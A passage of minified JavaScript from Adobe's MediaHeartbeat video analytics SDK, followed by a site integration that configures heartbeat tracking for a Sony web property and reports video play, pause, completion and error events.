e.getData(C).getValue(n.MEDIAINFO_KEY_MEDIATYPE)!==i.MediaType.Audio||k.isGreaterThanEqual(this._appMeasurement.version,"2.11.0")},i.prototype._isValidMediaObject=function(e){var t=e.getData(C);if(t&&t instanceof n){var a=t.getValue(i.MediaObjectKey.MediaResumed);null!=a&&"boolean"!=typeof a&&this._logger.warn(P,"Ignoring value set for MediaHeartbeat.MediaObjectKey.MediaResumed in MediaObject as we expect a boolean value");var o=t.getValue(i.MediaObjectKey.PrerollTrackingWaitingTime);null!=o&&(("string"==typeof o||"number"==typeof o)&&!isNaN(o)||this._logger.warn(P,"Ignoring value set for MediaHeartbeat.MediaObjectKey.PrerollTrackingWaitingTime in MediaObject as we expect a valid duration as number in milliseconds."));var r=t.getValue(i.MediaObjectKey.StandardMediaMetadata);return null!=r&&"object"!=typeof r&&this._logger.warn(P,"Ignoring value set for MediaHeartbeat.MediaObjectKey.StandardMediaMetadata in MediaObject as we expect a valid object with kv pairs."),!0}return!1},i.prototype._isValidAdBreakObject=function(e){var t=e.getData(A);return t&&t instanceof n},i.prototype._isDifferentAdBreakObject=function(e){var t=e.getData(A);return!(this._currentAdBreakObject&&this._currentAdBreakObject.isEqual(t))},i.prototype._isValidAdObject=function(e){var t=e.getData(L);if(t&&t instanceof n){var a=t.getValue(M);null!=a&&"boolean"!=typeof a&&this._logger.warn(P,"Ignoring value set for MediaHeartbeat.MediaObjectKey.GranularAdTracking in AdObject as we expect a boolean value.");var o=t.getValue(i.MediaObjectKey.StandardAdMetadata);return null!=o&&"object"!=typeof o&&this._logger.warn(P,"Ignoring value set for MediaHeartbeat.MediaObjectKey.StandardAdMetadata in AdObject as we expect a valid object with kv pairs."),!0}return!1},i.prototype._isDifferentAdObject=function(e){var t=e.getData(L);return!(this._currentAdObject&&this._currentAdObject.isEqual(t))},i.prototype._isValidChapterObject=function(e){var t=e.getData(N);return t&&t instanceof n},i.prototype._isDifferentChapterObject=function(e){var t=e.getData(N);return!(this._currentChapterObject&&this._currentChapterObject.isEqual(t))},i.prototype._isValidTimedMetadataObject=function(e){var t=e.getData(q);if(t&&t instanceof n){var a=t.getValue(n.MEDIAINFO_KEY_TIMEDMETADATA);return a&&"string"==typeof a}return!1},i.prototype._shouldAllowPlayerStateChange=function(e){return!(this._isInState(E.AdBreak)&&!this._isInState(E.Ad))},i.prototype._deferredTrackPlay=function(){this._prerollWaitEnabled&&(this._logger.info(P,"Executing deferred API:trackPlay."),this._prerollWaitEnabled=!1,this._playTaskHandle=null,this._processRule(D.Play))},i.prototype._cmdEnterAction=function(e){var t=e.getRuleName();if(this._prerollWaitEnabled)if(this._playReceived)switch(t){case D.SeekStart:case D.BufferStart:this._logger.info(P,"Cancelling scheduled API:trackPlay because of SeekStart/BufferStart event"),this._taskScheduler.cancelTask(this._playTaskHandle),this._playTaskHandle=null;break;case D.SeekComplete:case D.BufferComplete:this._logger.info(P,"Rescheduled API:trackPlay after SeekComplete/BufferComplete event"),this._playTaskHandle=this._taskScheduler.scheduleTask(this._deferredTrackPlay,this,this._prerollWaitTime);break;case D.Play:this._logger.info(P,"Dropping API:trackPlay as we already have a API:trackPlay scheduled."),e.stopProcessingAction();break;case D.Pause:this._logger.info(P,"Cancelling scheduled API:trackPlay because of API:trackPause call."),this._taskScheduler.cancelTask(this._playTaskHandle),this._playTaskHandle=null,this._prerollWaitEnabled=!1;break;case D.AdBreakStart:this._logger.info(P,"Received API:trackEvent(AdBreakStart) within "+this._prerollWaitTime+" ms after API:trackPlay. We will track this as preroll AdBreak."),this._taskScheduler.cancelTask(this._playTaskHandle),this._playTaskHandle=null,this._prerollWaitEnabled=!1,this._playAfterAdStart=!0}else switch(t){case D.Play:this._logger.info(P,"Deferring API:trackPlay for "+this._prerollWaitTime+" ms."),this._playReceived=!0,this._playTaskHandle=this._taskScheduler.scheduleTask(this._deferredTrackPlay,this,this._prerollWaitTime),e.stopProcessingAction();break;case D.AdBreakStart:this._logger.info(P,"Received trackEvent(AdBreakStart) before first trackPlay."),this._prerollWaitEnabled=!1}},i.prototype._cmdExitAction=function(e){var t=e.getRuleName();this._playAfterAdStart&&(t===D.AdStart?(this._cmdPlay(e),this._playAfterAdStart=!1):t===D.AdBreakComplete&&(this._playAfterAdStart=!1)),t!==D.AdStart||this._isInState(E.FPlayPause)||this._cmdPlay(e)},i.prototype._cmdConfigure=function(e){this._resetState(),this._configureAdobeAnalyticsPlugin(),this._configureAdobeHearbeatPlugin(),this._configureVideoPlayerPlugin(),this._configureOtherPlugins(),this._configureHeartbeat()},i.prototype._cmdSessionStart=function(e){var t=e.getData(C),a=e.getData(x);this._currentMediaObject=t,this._videoInfo=t.createVideoInfo(),this._videoInfo.playerName=this._config.playerName?this._config.playerName:"";var o=t.getValue(i.MediaObjectKey.StandardMediaMetadata);o&&"object"==typeof o||(o=null);var r=t.getValue(i.MediaObjectKey.MediaResumed);"boolean"==typeof r&&(this._videoInfo.resumed=r);var n=t.getValue(i.MediaObjectKey.PrerollTrackingWaitingTime);"string"!=typeof n&&"number"!=typeof n||isNaN(n)||(this._prerollWaitTime=Number(n),this._prerollWaitTime<=0&&(this._prerollWaitEnabled=!1));var s=this._prepareMetadata(o,a);s[V]=this._videoInfo.mediaType,this._aaPlugin.setVideoMetadata(s),this._playerPlugin.trackVideoLoad(),this._playerPlugin.trackSessionStart(),this._setState(E.Session,!0),this._setState(E.Media,!0)},i.prototype._cmdVideoEnd=function(e){var t=e.getRuleName()===D.VideoComplete;if(this._isInState(E.Media)){var a=this._heartbeat,o=this._playerPlugin;this._playerPlugin.trackComplete((function(){o&&o.trackVideoUnload(),a&&a.destroy()}),t)}this._setState(E.Media,!1)},i.prototype._cmdHandleMediaComplete=function(e){this._isInMedia(e)||(this._logger.info(P,"API:trackComplete has already cleaned up Heartbeat instance."),this._cmdSessionEnd(e),e.stopProcessingAction())},i.prototype._cmdSessionEnd=function(e){this._setState(E.Session,!1),this._resetState()},i.prototype._cmdDisableTracking=function(e){this._logger.info(P,"#_cmdDisableTracking: ADBMediaHeartbeat Tracking Disabled Remotely."),this._mediaHeartbeatDisabled=!0},i.prototype._cmdBufferStart=function(e){this._playerPlugin.trackBufferStart(),this._setState(E.Buffer,!0)},i.prototype._cmdBufferComplete=function(e){this._isInState(E.Buffer)&&this._playerPlugin.trackBufferComplete(),this._setState(E.Buffer,!1)},i.prototype._cmdSeekStart=function(e){this._playerPlugin.trackSeekStart(),this._setState(E.Seek,!0)},i.prototype._cmdSeekComplete=function(e){this._isInState(E.Seek)&&this._playerPlugin.trackSeekComplete(),this._setState(E.Seek,!1)},i.prototype._cmdPlay=function(e){this._playerPlugin.trackPlay(),this._setState(E.PlayPause,!0),this._setState(E.FPlayPause,!0)},i.prototype._cmdPause=function(e){this._playerPlugin.trackPause(),this._setState(E.PlayPause,!1),this._setState(E.FPlayPause,!0)},i.prototype._cmdAdBreakStart=function(e){var t=e.getData(A);this._currentAdBreakObject=t,this._adBreakInfo=t.createAdBreakInfo(),this._adBreakInfo.playerName=this._config.playerName?this._config.playerName:"",this._playerPlugin.trackAdBreakStart(),this._setState(E.AdBreak,!0)},i.prototype._cmdAdBreakComplete=function(e){this._currentAdBreakObject=null,this._adBreakInfo=null,this._isInState(E.AdBreak)&&this._playerPlugin.trackAdBreakComplete(),this._setState(E.AdBreak,!1)},i.prototype._cmdAdStart=function(e){var t=e.getData(L),a=e.getData(x);this._currentAdObject=t,this._adInfo=t.createAdInfo();var o=t.getValue(M);"boolean"==typeof o&&(this._adInfo.granularTracking=o);var r=t.getValue(i.MediaObjectKey.StandardAdMetadata);r&&"object"==typeof r||(r=null);var n=this._prepareMetadata(r,a);this._aaPlugin.setAdMetadata(n),this._playerPlugin.trackAdStart(),this._setState(E.Ad,!0)},i.prototype._cmdAdComplete=function(e){this._currentAdObject=null,this._adInfo=null,this._isInState(E.Ad)&&this._playerPlugin.trackAdComplete(),this._setState(E.Ad,!1)},i.prototype._cmdAdSkip=function(e){this._currentAdObject=null,this._adInfo=null,this._isInState(E.Ad)&&this._playerPlugin.trackAdSkip(),this._setState(E.Ad,!1)},i.prototype._cmdChapterStart=function(e){var t=e.getData(N),a=e.getData(x);this._currentChapterObject=t,this._chapterInfo=t.createChapterInfo();var o=this._prepareMetadata(null,a);this._aaPlugin.setChapterMetadata(o),this._playerPlugin.trackChapterStart(),this._setState(E.Chapter,!0)},i.prototype._cmdChapterComplete=function(e){this._currentChapterObject=null,this._chapterInfo=null,this._isInState(E.Chapter)&&this._playerPlugin.trackChapterComplete(),this._setState(E.Chapter,!1)},i.prototype._cmdChapterSkip=function(e){this._currentChapterObject=null,this._chapterInfo=null,this._isInState(E.Chapter)&&this._playerPlugin.trackChapterSkip(),this._setState(E.Chapter,!1)},i.prototype._cmdError=function(e){var t=e.getData(j);t||(t="unknown_error_id"),this._playerPlugin.trackVideoPlayerError(t)},i.prototype._cmdBitrate=function(e){this._playerPlugin.trackBitrateChange()},i.prototype._cmdTimedMetadataUpdate=function(e){var t=e.getData(q).getValue(n.MEDIAINFO_KEY_TIMEDMETADATA);this._playerPlugin.trackTimedMetadata(t)},i.prototype._processRule=function(e,t){return this._ruleEngine.processRule(e,t)},i.prototype._setupRules=function(){this._ruleEngine.registerEnterExitAction(this._cmdEnterAction,this._cmdExitAction),this._ruleEngine.registerRule(D.SessionStart,"API:trackSessionStart",[f.createPredicate(this._isPlatformTrackingSupported,!0,I.ErrUnSupportedPlatform),f.createPredicate(this._isTrackingDisabled,!1,I.ErrTrackingDisabled),f.createPredicate(this._isInSession,!1,I.ErrInSession),f.createPredicate(this._isValidMediaObject,!0,I.ErrInvalidMediaObject),f.createPredicate(this._isAudioTrackingSupported,!0,I.ErrAudioTrackingNotSupported)],[this._cmdConfigure,this._cmdSessionStart],this),this._ruleEngine.registerRule(D.SessionEnd,"API:trackSessionEnd",[f.createPredicate(this._isInSession,!0,I.ErrNotInSession)],[this._cmdHandleMediaComplete,this._cmdAdSkip,this._cmdAdBreakComplete,this._cmdChapterSkip,this._cmdVideoEnd,this._cmdSessionEnd],this),this._ruleEngine.registerRule(D.VideoComplete,"API:trackComplete",[f.createPredicate(this._isInSession,!0,I.ErrNotInSession),f.createPredicate(this._isInMedia,!0,I.ErrNotInMedia)],[this._cmdAdSkip,this._cmdAdBreakComplete,this._cmdChapterSkip,this._cmdVideoEnd],this),this._ruleEngine.registerRule(D.DisableTracking,"DisableTracking",[f.createPredicate(this._isTrackingDisabled,!1,I.ErrTrackingDisabled)],[this._cmdDisableTracking],this),this._ruleEngine.registerRule(D.Error,"API:trackError",[f.createPredicate(this._isInSession,!0,I.ErrNotInSession),f.createPredicate(this._isInMedia,!0,I.ErrNotInMedia)],[this._cmdError],this),this._ruleEngine.registerRule(D.Play,"API:trackPlay",[f.createPredicate(this._isInSession,!0,I.ErrNotInSession),f.createPredicate(this._isInMedia,!0,I.ErrNotInMedia),f.createPredicate(this._shouldAllowPlayerStateChange,!0,I.ErrInvalidPlayerState)],[this._cmdSeekComplete,this._cmdBufferComplete,this._cmdPlay],this),this._ruleEngine.registerRule(D.Pause,"API:trackPause",[f.createPredicate(this._isInSession,!0,I.ErrNotInSession),f.createPredicate(this._isInMedia,!0,I.ErrNotInMedia),f.createPredicate(this._shouldAllowPlayerStateChange,!0,I.ErrInvalidPlayerState),f.createPredicate(this._isInBuffer,!1,I.ErrInBuffer),f.createPredicate(this._isInSeek,!1,I.ErrInSeek)],[this._cmdPause],this),this._ruleEngine.registerRule(D.BufferStart,"API:trackEvent(BufferStart)",[f.createPredicate(this._isInSession,!0,I.ErrNotInSession),f.createPredicate(this._isInMedia,!0,I.ErrNotInMedia),f.createPredicate(this._shouldAllowPlayerStateChange,!0,I.ErrInvalidPlayerState),f.createPredicate(this._isInBuffer,!1,I.ErrInBuffer),f.createPredicate(this._isInSeek,!1,I.ErrInSeek)],[this._cmdBufferStart],this),this._ruleEngine.registerRule(D.BufferComplete,"API:trackEvent(BufferComplete)",[f.createPredicate(this._isInSession,!0,I.ErrNotInSession),f.createPredicate(this._isInMedia,!0,I.ErrNotInMedia),f.createPredicate(this._shouldAllowPlayerStateChange,!0,I.ErrInvalidPlayerState),f.createPredicate(this._isInBuffer,!0,I.ErrNotInBuffer)],[this._cmdBufferComplete],this),this._ruleEngine.registerRule(D.SeekStart,"API:trackEvent(SeekStart)",[f.createPredicate(this._isInSession,!0,I.ErrNotInSession),f.createPredicate(this._isInMedia,!0,I.ErrNotInMedia),f.createPredicate(this._shouldAllowPlayerStateChange,!0,I.ErrInvalidPlayerState),f.createPredicate(this._isInSeek,!1,I.ErrInSeek),f.createPredicate(this._isInBuffer,!1,I.ErrInBuffer)],[this._cmdSeekStart],this),this._ruleEngine.registerRule(D.SeekComplete,"API:trackEvent(SeekComplete)",[f.createPredicate(this._isInSession,!0,I.ErrNotInSession),f.createPredicate(this._isInMedia,!0,I.ErrNotInMedia),f.createPredicate(this._shouldAllowPlayerStateChange,!0,I.ErrInvalidPlayerState),f.createPredicate(this._isInSeek,!0,I.ErrNotInSeek)],[this._cmdSeekComplete],this),this._ruleEngine.registerRule(D.AdBreakStart,"API:trackEvent(AdBreakStart)",[f.createPredicate(this._isInSession,!0,I.ErrNotInSession),f.createPredicate(this._isInMedia,!0,I.ErrNotInMedia),f.createPredicate(this._isValidAdBreakObject,!0,I.ErrInvalidAdBreakObject),f.createPredicate(this._isDifferentAdBreakObject,!0,I.ErrDuplicateAdBreakObject)],[this._cmdAdSkip,this._cmdAdBreakComplete,this._cmdAdBreakStart],this),this._ruleEngine.registerRule(D.AdBreakComplete,"API:trackEvent(AdBreakComplete)",[f.createPredicate(this._isInSession,!0,I.ErrNotInSession),f.createPredicate(this._isInMedia,!0,I.ErrNotInMedia),f.createPredicate(this._isInAdBreak,!0,I.ErrNotInAdBreak)],[this._cmdAdSkip,this._cmdAdBreakComplete],this),this._ruleEngine.registerRule(D.AdStart,"API:trackEvent(AdStart)",[f.createPredicate(this._isInSession,!0,I.ErrNotInSession),f.createPredicate(this._isInMedia,!0,I.ErrNotInMedia),f.createPredicate(this._isInAdBreak,!0,I.ErrNotInAdBreak),f.createPredicate(this._isValidAdObject,!0,I.ErrInvalidAdObject),f.createPredicate(this._isDifferentAdObject,!0,I.ErrDuplicateAdObject)],[this._cmdAdSkip,this._cmdAdStart],this),this._ruleEngine.registerRule(D.AdComplete,"API:trackEvent(AdComplete)",[f.createPredicate(this._isInSession,!0,I.ErrNotInSession),f.createPredicate(this._isInMedia,!0,I.ErrNotInMedia),f.createPredicate(this._isInAdBreak,!0,I.ErrNotInAdBreak),f.createPredicate(this._isInAd,!0,I.ErrNotInAd)],[this._cmdAdComplete],this),this._ruleEngine.registerRule(D.AdSkip,"API:trackEvent(AdSkip)",[f.createPredicate(this._isInSession,!0,I.ErrNotInSession),f.createPredicate(this._isInMedia,!0,I.ErrNotInMedia),f.createPredicate(this._isInAdBreak,!0,I.ErrNotInAdBreak),f.createPredicate(this._isInAd,!0,I.ErrNotInAd)],[this._cmdAdSkip],this),this._ruleEngine.registerRule(D.ChapterStart,"API:trackEvent(ChapterStart)",[f.createPredicate(this._isInSession,!0,I.ErrNotInSession),f.createPredicate(this._isInMedia,!0,I.ErrNotInMedia),f.createPredicate(this._isValidChapterObject,!0,I.ErrInvalidChapterObject),f.createPredicate(this._isDifferentChapterObject,!0,I.ErrDuplicateChapterObject)],[this._cmdChapterSkip,this._cmdChapterStart],this),this._ruleEngine.registerRule(D.ChapterComplete,"API:trackEvent(ChapterComplete)",[f.createPredicate(this._isInSession,!0,I.ErrNotInSession),f.createPredicate(this._isInMedia,!0,I.ErrNotInMedia),f.createPredicate(this._isInChapter,!0,I.ErrNotInChapter)],[this._cmdChapterComplete],this),this._ruleEngine.registerRule(D.ChapterSkip,"API:trackEvent(ChapterSkip)",[f.createPredicate(this._isInSession,!0,I.ErrNotInSession),f.createPredicate(this._isInMedia,!0,I.ErrNotInMedia),f.createPredicate(this._isInChapter,!0,I.ErrNotInChapter)],[this._cmdChapterSkip],this),this._ruleEngine.registerRule(D.BitrateChange,"API:trackEvent(BitrateChange)",[f.createPredicate(this._isInSession,!0,I.ErrNotInSession),f.createPredicate(this._isInMedia,!0,I.ErrNotInMedia)],[this._cmdBitrate],this),this._ruleEngine.registerRule(D.TimedMetadataUpdate,"API:trackEvent(TimedMetadataUpdate)",[f.createPredicate(this._isInSession,!0,I.ErrNotInSession),f.createPredicate(this._isInMedia,!0,I.ErrNotInMedia),f.createPredicate(this._isValidTimedMetadataObject,!0,I.ErrInvalidTimedMetadataObject)],[this._cmdTimedMetadataUpdate],this)},i.prototype._configureAdobeAnalyticsPlugin=function(){this._aaPlugin=new p(this._appMeasurement,new _(this));var e=new m;e.channel=this._config.channel?this._config.channel:"",e.debugLogging=a.MediaHeartbeat._debugLogging||this._config.debugLogging,this._aaPlugin.configure(e),this._plugins.push(this._aaPlugin)},i.prototype._configureAdobeHearbeatPlugin=function(){var e=this._appMeasurement.visitor?this._appMeasurement.visitor.marketingCloudOrgID:"";this._ahPlugin=new h(new v(this));var t=new y(this._config.trackingServer,e);t.debugLogging=a.MediaHeartbeat._debugLogging||this._config.debugLogging,t.ovp=this._config.ovp?this._config.ovp:"",t.ssl=this._config.ssl,t.sdk=this._config.appVersion?this._config.appVersion:"";var o=this._primetimeTVSDKVersion();o&&o.length>0&&(t.__primetime=!0,t.__psdkVersion=o),this._ahPlugin.configure(t),this._plugins.push(this._ahPlugin)},i.prototype._configureVideoPlayerPlugin=function(){this._playerPlugin=new l(new g(this));var e=new u;e.debugLogging=a.MediaHeartbeat._debugLogging||this._config.debugLogging,this._playerPlugin.configure(e),this._plugins.push(this._playerPlugin)},i.prototype._configureOtherPlugins=function(){if(a.plugins.nielsen&&this._config.nielsenConfigKey&&this._config.nielsenAppInfo){this._nielsenPlugin=new a.plugins.nielsen.NielsenPlugin(new a._NielsenPluginDelegate(this,this._logger));var e=new a.plugins.nielsen.NielsenPluginConfig;e.debugLogging=a.MediaHeartbeat._debugLogging||this._config.debugLogging,e.appInfo=this._config.nielsenAppInfo,e.configKey=this._config.nielsenConfigKey,this._nielsenPlugin.configure(e),this._plugins.push(this._nielsenPlugin)}},i.prototype._configureHeartbeat=function(){var e=new d;e.debugLogging=a.MediaHeartbeat._debugLogging||this._config.debugLogging,this._heartbeat=new s(new c(this),this._plugins),this._heartbeat.configure(e)},i.prototype._resetState=function(){this._taskScheduler.clearTasks(),this._mediaState={},this._plugins=[],this._playerPlugin=null,this._aaPlugin=null,this._ahPlugin=null,this._nielsenPlugin=null,this._heartbeat=null,this._currentMediaObject=null,this._currentAdBreakObject=null,this._currentAdObject=null,this._currentChapterObject=null,this._videoInfo=null,this._adBreakInfo=null,this._adInfo=null,this._chapterInfo=null,this._prerollWaitEnabled=!0,this._prerollWaitTime=O,this._playReceived=!1,this._playTaskHandle=null,this._playAfterAdStart=!1},i.prototype._primetimeTVSDKVersion=function(){return this._currentMediaObject?this._currentMediaObject.getValue(R):null},i.prototype._cleanContextData=function(e){if(null==e||"object"!=typeof e)return null;var t={};for(var a in e)if(e.hasOwnProperty(a)){var o=e[a];"number"!=typeof o&&"string"!=typeof o&&"boolean"!=typeof o||(t[a]=o)}return t},i.prototype._prepareMetadata=function(e,t){var a={};if(t&&w.append(a,t),e){var o=this._cleanContextData(e);w.append(a,o)}return delete a[V],a},i.prototype._onDelegateError=function(e){this._logger.error(P,e.getMessage()+" | "+e.getDetails())},i.prototype._disableHBTracking=function(){var e=f.createContext();this._processRule(D.DisableTracking,e),this._processRule(D.SessionEnd,e)};var E={Session:0,Media:1,AdBreak:2,Ad:3,Chapter:4,PlayPause:5,Buffer:6,Seek:7,FPlayPause:8},D={SessionStart:0,SessionEnd:1,VideoComplete:2,Play:3,Pause:4,Error:5,AdBreakStart:6,AdBreakComplete:7,AdStart:8,AdComplete:9,AdSkip:10,ChapterStart:11,ChapterComplete:12,ChapterSkip:13,SeekStart:14,SeekComplete:15,BufferStart:16,BufferComplete:17,BitrateChange:18,TimedMetadataUpdate:19,DisableTracking:20},I={ErrUnSupportedPlatform:"MediaHeartbeat does not support tracking due to AppMeasurement or VisitorAPI not supporting the browser.",ErrNotInSession:'MediaHeartbeat is not in active tracking session, call "API:trackSessionStart" to begin a new tracking session.',ErrInSession:'MediaHeartbeat is in active tracking session, call "API:trackSessionEnd" to end current tracking session.',ErrTrackingDisabled:"MediaHeartbeat tracking is disabled for this publisher. Please contact Adobe Representative to enable tracking.",ErrNotInMedia:'MediaHeartbeat has completed tracking session, call "API:trackSessionEnd" first to end current session and then begin a new tracking session.',ErrInBuffer:'MediaHeartbeat is tracking buffer events, call "API:trackEvent(BufferComplete)" first to stop tracking buffer events.',ErrNotInBuffer:'MediaHeartbeat is not tracking buffer events, call "API:trackEvent(BufferStart)" before "API:trackEvent(BufferComplete)".',ErrInSeek:'MediaHeartbeat is tracking seek events, call "API:trackEvent(SeekComplete)" first to stop tracking seek events.',ErrNotInSeek:'MediaHeartbeat is not tracking seek events, call "API:trackEvent(SeekStart)" before "API:trackEvent(SeekComplete)".',ErrNotInAdBreak:'MediaHeartbeat is not tracking any AdBreak, call "API:trackEvent(AdBreakStart)" to begin tracking AdBreak',ErrNotInAd:'MediaHeartbeat is not tracking any Ad, call "API:trackEvent(AdStart)" to begin tracking Ad',ErrNotInChapter:'MediaHeartbeat is not tracking any Chapter, call "API:trackEvent(ChapterStart)" to begin tracking Chapter',ErrInvalidMediaObject:'MediaInfo passed into "API:trackSessionStart" is invalid.',ErrInvalidAdBreakObject:'AdBreakInfo passed into "API:trackEvent(AdBreakStart)" is invalid.',ErrDuplicateAdBreakObject:'MediaHeartbeat is currently tracking the AdBreak passed into "API:trackEvent(AdBreakStart)".',ErrInvalidAdObject:'AdInfo passed into "API:trackEvent(AdStart)" is invalid.',ErrDuplicateAdObject:'MediaHeartbeat is currently tracking the Ad passed into "API:trackEvent(AdStart)".',ErrInvalidChapterObject:'ChapterInfo passed into "API:trackEvent(ChapterStart)" is invalid.',ErrDuplicateChapterObject:'MediaHeartbeat is currently tracking the Chapter passed into "API:trackEvent(ChapterStart)".',ErrInvalidTimedMetadataObject:'TimedMetadata passed into "API:trackEvent(TimedMetadataUpdate)" is invalid.',ErrInvalidPlayerState:"MediaHeartbeat is tracking an AdBreak but not tracking any Ad and will drop any calls to track player state (Play, Pause, Buffer or Seek) in this state.",ErrAudioTrackingNotSupported:"Upgrade your AppMeasurement library to version >= '2.11.0' to support tracking audio content."},P="MediaHeartbeat",C="key_media_object",A="key_adbreak_object",L="key_ad_object",N="key_chapter_object",q="key_timed_metadata_object",x="key_custom_metadata",j="key_error_id",V="a.media.streamType",R="a.__pttvsdkVersion",M="granular_ad_tracking",O=250;a._MediaHeartbeatErrorMessage=I,a.MediaHeartbeatDelegate=o,a.MediaHeartbeat=i,a.MediaHeartbeat._debugLogging=!1}(e.ADB.core,e.ADB.va),e.ADB||(e.ADB={}),e.ADB.core||(e.ADB.core=core),e.ADB.va||(e.ADB.va=va),e.ADB.va.plugins||(e.ADB.va.plugins={})}(this)}).call(window),window._bsq=window._bsq||{};var l=ADB.va.MediaHeartbeat,u=ADB.va.MediaHeartbeatConfig,g=ADB.va.MediaHeartbeatDelegate;_bsq.hb={},_bsq.hb.video={},_bsq.hb.markers=_bsq.hb.markers||[25,50,75,85,90,95],_bsq.hb.config={HEARTBEAT:{TRACKING_SERVER:"sonyglobal.hb.omtrdc.net",PUBLISHER:"7286403D53B6AA9A0A490D4C@AdobeOrg",CHANNEL:location.hostname,OVP:"",SDK:"VHL2 v2.2.0",SSL:!0,debugLogging:""!==_bsq.utils.docCookies.getItem("hbdebug")}},_bsq.hb.videoTrack=function(e){var t,a,o="",i="",r="",n="",s=function(e,t,a,o){return"YouTubePlayer"!==e||/^global:gwx$/gi.test(utag_data.website_platform)?o:""===a&&""===o?"yt_video":"yt_"+t+"_"+a+"_"+o};if(this.videoHandler=function(e){if(utag.DB("*********  VIDEO HANDLER ***********************"),utag.DB(e),0===e.data.duration&&"FlowPlayer"===e.data.videoType&&(e.data.duration=e.data.player.duration||0),/^(unstarted|loadeddata)$/gi.test(e.type)&&void 0===_bsq.hb.video[e.data.id]&&"FlowPlayer"===e.data.videoType){_bsq.hb.video[e.data.id]={},event_name="video_load";var t=s(e.data.videoType,e.data.quality,e.data.id,e.data.name);p(e.data.id,0,e.data.videoType,_bsq.hb.config,e.data.player),_bsq.hb.video[e.data.id].mediaObject=new l.createMediaObject(t,e.data.id,e.data.duration,l.StreamType.VOD),_bsq.hb.video[e.data.id].mediaHeartbeat.trackSessionStart(_bsq.hb.video[e.data.id].mediaObject,{}),_bsq.hb.video[e.data.id].firstLoad=!1,_bsq.hb.video[e.data.id].started=!0,_bsq.hb.video[e.data.id].mediaHeartbeat.trackPlay(),video_load_event=new CustomEvent("video_load",{videoName:t,videoId:e.data.id,videoDuration:e.data.duration,videoCurrentTime:e.data.currentTime}),document.dispatchEvent(video_load_event),utag.DB("-----\x3e SESSION START")}if(/^(playing|play|seeked)$/gi.test(e.type))if(void 0===_bsq.hb.video[e.data.id]&&"FlowPlayer"!==e.data.videoType){_bsq.hb.video[e.data.id]={},event_name="video_load";t=s(e.data.videoType,e.data.quality,e.data.id,e.data.name);p(e.data.id,0,e.data.videoType,_bsq.hb.config,e.data.player),_bsq.hb.video[e.data.id].mediaObject=new l.createMediaObject(t,e.data.id,e.data.duration,l.StreamType.VOD),_bsq.hb.video[e.data.id].mediaHeartbeat.trackSessionStart(_bsq.hb.video[e.data.id].mediaObject,{}),_bsq.hb.video[e.data.id].firstLoad=!1,_bsq.hb.video[e.data.id].started=!0,_bsq.hb.video[e.data.id].mediaHeartbeat.trackPlay(),video_load_event=new CustomEvent("video_load",{videoName:t,videoId:e.data.id,videoDuration:e.data.duration,videoCurrentTime:e.data.currentTime}),document.dispatchEvent(video_load_event),utag.DB("-----\x3e SESSION START")}else if(void 0!==_bsq.hb.video[e.data.id]&&void 0!==_bsq.hb.video[e.data.id].firstLoad&&!1===_bsq.hb.video[e.data.id].firstLoad&&void 0!==_bsq.hb.video[e.data.id].started&&!1===_bsq.hb.video[e.data.id].started){p(e.data.id,0,e.data.videoType,_bsq.hb.config,e.data.player);t=s(e.data.videoType,e.data.quality,e.data.id,e.data.name);_bsq.hb.video[e.data.id].mediaObject=new l.createMediaObject(t,e.data.id,e.data.duration,l.StreamType.VOD),_bsq.hb.video[e.data.id].mediaHeartbeat.trackSessionStart(_bsq.hb.video[e.data.id].mediaObject,{}),_bsq.hb.video[e.data.id].started=!0,_bsq.hb.video[e.data.id].mediaHeartbeat.trackPlay(),utag.DB("-----\x3e SESSION START && TRACK PLAY"),video_start_event=new CustomEvent("video_start",{videoName:t,videoId:e.data.id,videoDuration:e.data.duration,videoCurrentTime:e.data.currentTime}),document.dispatchEvent(video_start_event)}else if(void 0!==_bsq.hb.video[e.data.id]&&void 0!==_bsq.hb.video[e.data.id].firstLoad&&!1===_bsq.hb.video[e.data.id].firstLoad&&void 0!==_bsq.hb.video[e.data.id].started&&!0===_bsq.hb.video[e.data.id].started){_bsq.hb.video[e.data.id].mediaHeartbeat.trackPlay();t=s(e.data.videoType,e.data.quality,e.data.id,e.data.name);video_resume_event=new CustomEvent("video_resume",{videoName:t,videoId:e.data.id,videoDuration:e.data.duration,videoCurrentTime:e.data.currentTime}),document.dispatchEvent(video_resume_event)}if(/^(paused|pause|seeking)$/gi.test(e.type)&&void 0!==_bsq.hb.video[e.data.id]&&(_bsq.hb.video[e.data.id].mediaHeartbeat.trackPause(),video_pause_event=new CustomEvent("video_pause",{videoName:e.data.name,videoId:e.data.id,videoDuration:e.data.duration,videoCurrentTime:e.data.currentTime}),document.dispatchEvent(video_pause_event)),/^(ended)$/gi.test(e.type)&&(_bsq.hb.video[e.data.id].mediaHeartbeat.trackComplete(),_bsq.hb.video[e.data.id].mediaHeartbeat.trackSessionEnd(),_bsq.hb.video[e.data.id].started=!1,video_complete_event=new CustomEvent("video_complete",{videoName:e.data.name,videoId:e.data.id,videoDuration:e.data.duration,videoCurrentTime:e.data.currentTime}),document.dispatchEvent(video_complete_event)),/^destroyed/gi.test(e.type)&&(_bsq.hb.video[e.data.id].mediaHeartbeat.trackSessionEnd(),_bsq.hb.video[e.data.id].started=!1),/^error$/gi.test(e.type)){var a="unknown_error";if(void 0!==e.data&&void 0!==e.data.errorCode)a=e.data.errorCode;else if(void 0!==e.target&&void 0!==e.target.error&&void 0!==e.target.error.code)a=e.target.error.code;else if(void 0!==e.data&&void 0===e.data.errorCode)return;t=s(e.data.videoType,e.data.quality,e.data.id,e.data.name);p(e.data.id,e.data.currentTime,e.data.videoType,_bsq.hb.config,e.data.player),_bsq.hb.video[e.data.id].mediaObject=new l.createMediaObject(e.data.name,e.data.id,e.data.duration,l.StreamType.VOD),_bsq.hb.video[e.data.id].mediaHeartbeat.trackSessionStart(_bsq.hb.video[e.data.id].mediaObject,{}),_bsq.hb.video[e.data.id].started=!0,_bsq.hb.video[e.data.id].mediaHeartbeat.trackError(a),_bsq.hb.video[e.data.id].mediaHeartbeat.trackSessionEnd(),_bsq.hb.video[e.data.id].started=!1,utag_data.aaLinkTrackVars="eVar16,eVar17,eVar14,eVar70,events",utag_data.aaLinkTrackEvents="event13",utag_data.aaEvents.push("event13"),utag_data.aaVideoName=t||"",utag_data.aaVideoErrorCode=a||"",utag_data.aaVideoQuality=e.data.quality||"",utag_data.aaPageURL=_bsq.utils.all_maskPIIData(document.URL),utag_data.aaPageURLExclParams=window.location.protocol+"//"+window.location.host+window.location.pathname,utag_data.aaLinkType="o",utag_data.aaLinkName="Video 